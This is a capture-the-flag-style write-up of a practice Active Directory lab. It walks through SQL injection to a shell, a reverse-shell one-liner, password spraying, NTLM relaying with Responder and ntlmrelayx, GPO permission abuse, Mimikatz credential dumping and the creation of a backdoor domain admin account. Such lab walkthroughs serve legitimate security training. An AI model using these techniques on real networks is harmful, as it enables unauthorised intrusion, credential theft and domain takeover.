# lkylabs version 1 writeup by chryzsh

This is a detailed writeup of version 1 of lkys37en's Active Directory lab. It contains elements of network enumeration, domain enumeration, relaying and abusing configuration/misconfiguration of security controls.

**Tools**
* Empire
* Powershell
* Responder
* Bloodhound
* Powerview
* Mimikatz
* Sqlmap
* Nmap
* CrackMapExec


## Network enumeration
nmap 10.7.12.11
10.7.12.12
10.7.12.13

## Getting a foothold
Sqlmap

Sql injection on WEB01 10.7.12.12 leads to os-shell as lab\sqladmin in sqlmap

In os-shell, use oneliner ninshang Invoke-PowerShellTcp.ps1 to get a proper shell


## Get a domain user
Get list of domain users with net users /domain

### Alternative route: password spraying
https://www.youtube.com/watch?v=hBvrC4t2hn8
Generate a list of passwords https://github.com/asciimoo/exrex


```
python exrex.py "(Spring|Winter|Autumn|Fall|Summer)(20)1(78)!" > passwords.txt
```

msfconsole
auxiliary/scanner/http/owa_login
set pass_file passwords.txt
set user_file usernames.txt
set domain
set rhost 10.7.12.10

## Domain enumeration
Bloodhound
Powerview

## File share enumeration
Powerview
net view \\fs01
dir \\fs01


Enumerate file shares. Find the \\FS01.lab.local\Groupdata using dir \\FS01.lab.local\ as sqladmin. You can also try net view \\fs01

The file share contains a VPN file that can be used to open a L2 tunnel into the internal lab on 10.8.13.0/24 subnet



## Relaying
Responder
ntlmrelay
CME?

Launch responder and capture netntlmv2 hashes that can be relayed. Responder should pick up two users
responder -I tap0 -wrf


Make a list of target machines, those should be WS05 if you check permissions of the users that are picked up.

Use ntlmrelay to relay the hashes and execute the ninshang powershell oneliner. Keep a listener ready

ntlmrelayx.py -tf targets.txt -c 'powershell.exe blabla oneliner'

A shell should now be granted on the target box as the user who's hash was relayed (lab\DPayne)


## GPO enumeration
Powerview

Enumerate GPOs with `Get-NetGPOGroup` to disover a GPO called MailServer-Config, which is interesting

Convert the SID of the Member to domain name

```
Convert-SidToName S-1-5-21-1704012399-894155344-4184019992-1154
```


This resolves to BUILTIN\Administrators
Enumerate GPOs further, including the MailServer-Config


```
Get-NetGPO -DisplayName MailServer-Config | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}
```


This shows that Server Admins has write permissions on the GPO.



```
ActiveDirectoryRights : CreateChild, DeleteChild, ReadProperty, WriteProperty, GenericExecute
```


We see that the group "Server Admins" has modification rights on this GPO. Let's trackthis back to which machines the GPO is applied to based on the GUID of the GPO.



```
Get-NetOU -GUID "{2259E5B0-3B49-4704-98BB-5A9581B54E8E}" | %{Get-NetComputer -ADSpath $_}
```


The result is merely MX01.lab.local, which indicates the GPO is applied on MX01
To view the GPO itself use:
 `type "\\lab.local\sysvol\lab.local\Policies\{2259E5B0-3B49-4704-98BB-5A9581B54E8E}\MACHINE\Preferences\Groups\Groups.xml"`
 
This GPO apparently adds a group to the builtin Administrators group on MX01. This can then be edited to instead add the "Server Admins" group.

To trigger the GPO for a specific machine use: `Invoke-GpUpdate -Computer MX01 -Force`

In a few minutes the GPO should be pushed to MX01 and local admin privileges should be granted to "Server Admins". It is then possible to use WinRM or other tricks to spawn a shell on the box.


## Getting domain admin
Mimikatz

Now, execute Mimikatz to get the credentials of users on the box. This gets the credentials of BDavis, a highly privileged server admin. Spawn a shell as BDavis on the box
Import Powerview on this box
Now, execute Mimikatz on MX01 and discover another user and his/her plaintext credentials. This user is domain admin so spawn a new shell. An alternative here would be using token impersonation.
Proceed to add yourself as a user on the domain and add yourself to the domain.
net user chryzsh password /add /domain
net group "Domain Admins" /add chryzsh /domain
net group "Remote Desktop Users" /add lab\chryzsh /domain

